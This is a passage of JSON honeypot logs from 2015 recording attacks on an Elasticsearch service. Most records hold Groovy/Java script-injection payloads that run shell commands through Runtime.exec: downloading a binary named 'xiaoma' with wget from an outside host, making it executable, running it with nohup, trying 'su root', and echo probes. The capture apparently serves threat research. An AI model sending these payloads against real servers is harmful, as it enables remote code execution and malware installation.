        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:33.487931679Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22.%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:38.880314606Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget%20-O%20%2Ftmp%2Fxiaoma%20http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22wget+-O+%2Ftmp%2Fxiaoma+http%3A%2F%2F222.186.15.246%3A8080%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:45.565501681Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su%20root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22su+root%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:40:55.243321399Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod%20777%20%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22chmod+777+%2Ftmp%2Fxiaoma%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "222.186.15.246",
    "@timestamp": "2015-03-23T14:41:00.653077044Z",
    "url": "x.x.x.x:9200/_search?source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match%5Fall%22%3A%7B%7D%7D%7D%7D%2C%22script%5Ffields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import%20java.util.%2A%3B%5Cnimport%20java.io.%2A%3B%5CnString%20str%20%3D%20%5C%22%5C%22%3BBufferedReader%20br%20%3D%20new%20BufferedReader%28new%20InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup%20%2Ftmp%2Fxiaoma%20%3E%20%2Fdev%2Fnull%202%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder%20sb%20%3D%20new%20StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "method": "GET",
    "form": "source=%7B%22size%22%3A1%2C%22query%22%3A%7B%22filtered%22%3A%7B%22query%22%3A%7B%22match_all%22%3A%7B%7D%7D%7D%7D%2C%22script_fields%22%3A%7B%22exp%22%3A%7B%22script%22%3A%22import+java.util.%2A%3B%5Cnimport+java.io.%2A%3B%5CnString+str+%3D+%5C%22%5C%22%3BBufferedReader+br+%3D+new+BufferedReader%28new+InputStreamReader%28Runtime.getRuntime%28%29.exec%28%5C%22nohup+%2Ftmp%2Fxiaoma+%3E+%2Fdev%2Fnull+2%3E%261%5C%22%29.getInputStream%28%29%29%29%3BStringBuilder+sb+%3D+new+StringBuilder%28%29%3Bwhile%28%28str%3Dbr.readLine%28%29%29%21%3Dnull%29%7Bsb.append%28str%29%3B%7Dsb.toString%28%29%3B%22%7D%7D%7D",
    "payload": "",
    "headers": {
        "user_agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
        "host": "x.x.x.x:9200",
        "content_type": "",
        "accept_language": ""
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "60.169.80.122",
    "@timestamp": "2015-03-23T17:51:34.301357149Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "post",
    "form": "pretty=",
    "payload": "{\"size\":1,\"script_fields\": {\"exp\": {\"script\":\"java.lang.Math.class.forName(\\\"java.io.BufferedReader\\\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\\\"java.io.InputStreamReader\\\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"echo qq952135763\\\").getInputStream())).readLines()\",\"lang\": \"groovy\"}}}",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "115.28.163.220",
    "@timestamp": "2015-03-24T01:57:47.538892364Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "POST",
    "form": "pretty=&%7B%22size%22%3A1%2C%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A%22java.lang.Math.class.forName%28%5C%22java.io.BufferedReader%5C%22%29.getConstructor%28java.io.Reader.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.io.InputStreamReader%5C%22%29.getConstructor%28java.io.InputStream.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22echo+qq952135763%5C%22%29.getInputStream%28%29%29%29.readLines%28%29%22%2C%22lang%22%3A+%22groovy%22%7D%7D%7D=",
    "payload": "",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded; Charset=UTF-8",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
{
    "source": "39.67.187.246",
    "@timestamp": "2015-03-24T02:37:22.551447043Z",
    "url": "x.x.x.x:9200/_search?pretty",
    "method": "POST",
    "form": "pretty=&%7B%22size%22%3A1%2C%22script_fields%22%3A+%7B%22exp%22%3A+%7B%22script%22%3A%22java.lang.Math.class.forName%28%5C%22java.io.BufferedReader%5C%22%29.getConstructor%28java.io.Reader.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.io.InputStreamReader%5C%22%29.getConstructor%28java.io.InputStream.class%29.newInstance%28java.lang.Math.class.forName%28%5C%22java.lang.Runtime%5C%22%29.getRuntime%28%29.exec%28%5C%22echo+qq952135763%5C%22%29.getInputStream%28%29%29%29.readLines%28%29%22%2C%22lang%22%3A+%22groovy%22%7D%7D%7D=",
    "payload": "",
    "headers": {
        "user_agent": "Java/1.8.0_31",
        "host": "x.x.x.x:9200",
        "content_type": "application/x-www-form-urlencoded; Charset=UTF-8",
        "accept_language": "zh-CN"
    },
    "type": "attack",
    "honeypot": "x.x.x.x"
}
